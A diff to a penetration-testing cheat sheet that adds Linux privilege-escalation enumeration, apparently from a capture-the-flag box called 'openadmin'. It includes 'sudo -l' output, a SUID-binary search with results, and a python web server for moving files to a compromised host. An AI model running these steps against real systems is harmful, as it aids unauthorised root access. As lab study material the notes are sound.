@@ -45,7 +45,42 @@ msf exploit > run
 ```
 ### Linux
 First steps to go from low-privilege user to root on a linux box.
-
+```
+joanna@openadmin:~$ sudo -l                                                                                          
+Matching Defaults entries for joanna on openadmin:                                                                       
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                       
+User joanna may run the following commands on openadmin:                                                                 
+  (ALL) NOPASSWD: /bin/nano /opt/priv                                                                              
+  joanna@openadmin:~$ 
+```
+Look at what the user can sudo and try to escalation from their. 
+After testing what the user can do, look to see what is running as root.
+```
+joanna@openadmin:~$ find / -perm -u=s -type f 2>/dev/null   
+/usr/lib/openssh/ssh-keysign     
+/usr/lib/eject/dmcrypt-get-device 
+/usr/lib/snapd/snap-confine       
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic  
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper    
+/usr/lib/policykit-1/polkit-agent-helper-1    
+/usr/bin/newgrp                              
+/usr/bin/pkexec         
+/usr/bin/newgidmap      
+/usr/bin/sudo   
+/usr/bin/passwd  
+/usr/bin/newuidmap
+/usr/bin/chsh      
+/usr/bin/traceroute6.iputils 
+/usr/bin/chfn           
+/usr/bin/gpasswd      
+/usr/bin/at  
+/bin/ping      
+/bin/umount     
+/bin/su        
+/bin/mount     
+/bin/fusermount
+joanna@openadmin:~$
+```
 Start a python http server to transfer files to the compromised machine. Note that this command will host files in your current directory, so make sure you copy all files before running the python SimpleHTTPServer.
 ```
 $ sudo python -m SimpleHTTPServer 80
